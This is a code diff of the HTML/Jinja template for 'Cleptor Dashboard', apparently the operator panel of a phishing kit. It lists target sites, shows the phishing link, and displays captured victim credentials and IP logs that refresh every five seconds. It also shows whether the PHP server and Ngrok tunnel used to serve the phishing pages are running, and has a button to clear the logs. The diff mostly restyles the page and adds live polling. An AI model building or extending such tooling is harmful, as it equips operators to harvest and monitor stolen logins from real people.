@@ -2,81 +2,247 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Cleptor Dashboard</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    * { box-sizing: border-box; }
-    body {
-      margin: 0;
-      display: flex;
-      font-family: monospace;
-      background-color: #0a0f14;
-      color: #00ff88;
-      height: 100vh;
-    }
-    .tools, .websites {
-      width: 200px;
-      background: #0f0f0f;
-      border-right: 2px solid #00ff88;
-      padding: 1rem;
-    }
-    .main {
-      flex: 1;
-      padding: 1.5rem;
-      overflow-y: auto;
-    }
-    h1, h2, h3 { color: #00ff88; }
-    select, button {
-      width: 100%;
-      padding: 0.5rem;
-      margin-top: 1rem;
-      background: #000;
-      color: #00ff88;
-      border: 1px solid #00ff88;
-    }
-    pre {
-      background: #111;
-      padding: 1rem;
-      border: 1px solid #00ffcc;
-      overflow-x: auto;
-      white-space: pre-wrap;
-    }
-    a {
-      color: #00ffff;
-      word-break: break-word;
-    }
-  </style>
+  <meta http-equiv="refresh" content="5">
+  <title>Cleptor Dashboard</title>
+ <style>
+  * {
+    padding: 0;
+    margin: 0; 
+    box-sizing: border-box;
+    backdrop-filter: blur(10px);
+    font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
+  }
+
+  body {
+    margin: 0;
+    display: flex;
+    font-family: monospace;
+    background-color: #0a0f14;
+    color: #00ff88;
+    height: 100vh;
+    /* background: url(/bg.jpg); */
+  }
+
+  .tools, .websites {
+    width: 15%;
+    padding: 30px;
+    margin: 10px;
+    display: flex;
+    align-content: center;
+    justify-content: start;
+    flex-direction: column;
+    background-color: #0a0f14;
+    border-radius: 2rem;
+    border: 0.5px solid #00ff9525;
+    box-shadow: 0 0 50px #00ff6a15;
+    min-width: 200px;
+  }
+
+  .websites {
+    border: none;
+    box-shadow: none;
+  }
+
+  .tools a {
+    padding: 0.75rem 1rem;
+    margin-top: 0rem;
+    background: #0d141a;
+    color: #00ff88;
+    border: 0.5px solid #00ff9525;
+    border-radius: 1rem;
+    box-shadow: 0 0 30px #00ff6a15;
+    transition: all 0.3s ease;
+  }
+
+  .tools h2 {
+    margin: 0 0 1rem 0;
+  }
+  
+  main {
+    width: 85%;
+    display: flex;
+    padding: 30px;
+    margin: 10px;
+    background-color: #0a0f14;
+    border-radius: 2rem;
+    border: 0.5px solid #00ff9525;
+    box-shadow: 0 0 50px #00ff6a25;
+  }
+
+  .main {
+    width: 100%;
+  }
+
+  .main div{
+    width: 100%;
+    display: flex;
+    flex-direction: column;
+    align-items: start;
+    justify-content: start;   
+    flex: 1;
+    padding: 30px;
+    margin: 10px;
+    background-color: #0a0f14;
+    border-radius: 2rem;
+    border: 0.5px solid #00ff9525;
+    box-shadow: 0 0 50px #00ff6a25;
+    overflow-y: auto;
+    gap: 0.5rem;
+  }
+
+  h1, h2, h3 {
+    color: #00ff88;
+    margin-top: 0;
+  }
+
+  select {
+    width: 100%;
+    background: transparent;
+    border: none;
+    /* padding: 0.75rem 1rem; */
+    margin-top: 0.5rem;
+  }
+
+  button{
+    width: 100%;
+    padding: 0.75rem 1rem;
+    margin-top: 1rem;
+    background: #0d141a;
+    color: #00ff88;
+    border: 0.5px solid #00ff9525;
+    border-radius: 1rem;
+    box-shadow: 0 0 30px #00ff6a15;
+    transition: all 0.3s ease;
+  }
+
+  select::-webkit-scrollbar {
+    width: 0;
+  }
+
+  select option {
+    padding: 0.75rem 1rem;
+    margin-top: .5rem;
+    background: #0d141a;
+    color: #00ff88;
+    border: 0.5px solid #00ff9525;
+    border-radius: 1rem;
+    box-shadow: 0 0 30px #00ff6a15;
+    transition: all 0.3s ease;
+  }
+
+  pre {
+    width: 100%;
+    background: #111;
+    padding: 1rem;
+    border-radius: 10px;
+    border: 0.5px solid #00ff9525;
+    box-shadow: 0 0 25px #00ff6a15;
+    white-space: pre-wrap;
+    overflow-x: auto;
+  }
+
+  a {
+    display: inline-block;
+    margin: 0.4rem 0;
+    text-decoration: none;
+    color: #00ffff;
+    padding: 0.75rem 1rem;
+    margin-top: 0rem;
+    background: #0d141a;
+    /* color: #00ff88; */
+    border: 0.5px solid #00ff9525;
+    border-radius: 1rem;
+    box-shadow: 0 0 30px #00ff6a15;
+    transition: all 0.3s ease;
+  }
+
+  p a {
+    border: none;
+    margin: 0;
+    padding: 0;
+    box-shadow: none;
+  }
+</style>
+
+
 </head>
 <body>
   <div class="tools">
-    <h2>🧰 Tools</h2>
-    <a href="/">Phishing</a><br><br>
+    <h2>Cleptor</h2>
+    <a href="/">Phishing</a>
     <a href="/logout">Logout</a>
   </div>
-  <div class="websites">  
-    <h3>🎯 Sites</h3>
-    <form method="POST">
-      <select name="site" size="12" onchange="this.form.submit()">
-        {% for site in websites %}
-        <option value="{{ site }}" {% if site == selected %}selected{% endif %}>{{ site }}</option>
-        {% endfor %}
-      </select>
-    </form>
-  </div>
-  <div class="main">
-    <h1>Cleptor Control Panel</h1>
-    <h3>🔗 Phishing URL:</h3>
-    <p><a href="{{ status.selected_link }}" target="_blank">{{ status.selected_link }}</a></p>
+  <main>
+    <div class="websites">  
+      <h3>🎯 Sites</h3>
+      <form method="POST">
+        <select name="site" size="12" onchange="this.form.submit()">
+          {% for site in websites %}
+          <option value="{{ site }}" {% if site == selected %}selected{% endif %}>{{ site }}</option>
+          {% endfor %}
+        </select>
+      </form>
+    </div>
+    <div class="main">
+      <div>
+        <!-- <h1>--------------------</h1> -->
+        <h1>{{ selected }}</h1>
+        <!-- <h1>--------------------</h1> -->
+      </div>
+      <br>
+      <div>
+        <!-- <h3>🔗 Phishing URL:</h3> -->
+        <p><a href="{{ status.selected_link }}" target="_blank">{{ status.selected_link }}</a></p>
+      </div>
+      
+      <div>
+        <h3>Credentials:</h3>
+        <pre id="creds">{{ creds }}</pre>
+  
+        <h3>IP Logs:</h3>
+        <pre id="ips">{{ ips }}</pre>
+  
+        <h3>Clear Logs:</h3>
+        <button onclick="clearLogs()">Clear {{ selected }} Logs</button>
+      </div>
 
-    <h3>📥 Credentials:</h3>
-    <pre>{{ creds }}</pre>
+      <script>
+      function clearLogs() {
+        fetch('/clear_logs', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({ site: "{{ selected }}" })
+        }).then(res => {
+          if (res.ok) location.reload();
+          else alert("Failed to clear logs.");
+        });
+      }
+      </script>
 
-    <h3>📍 IP Logs:</h3>
-    <pre>{{ ips }}</pre>
+      <div>
+        <h3>⚙️ Status:</h3>
+        <p>PHP: {{ '✅' if status.php else '❌' }}</p>
+        <p>Ngrok: {{ '✅' if status.ngrok else '❌' }}</p>
+      </div>
 
-    <h3>⚙️ Status:</h3>
-    <p>PHP: {{ '✅' if status.php else '❌' }}</p>
-    <p>Ngrok: {{ '✅' if status.ngrok else '❌' }}</p>
-  </div>
+    </div>
+  </main>
+  
+
+<script>
+function refreshLogs() {
+  fetch('/get_logs?site={{ selected }}')
+    .then(res => res.json())
+    .then(data => {
+      document.getElementById('creds').textContent = data.creds;
+      document.getElementById('ips').textContent = data.ips;
+    });
+}
+setInterval(refreshLogs, 5000); // every 5 seconds
+</script>
+
 </body>
 </html>
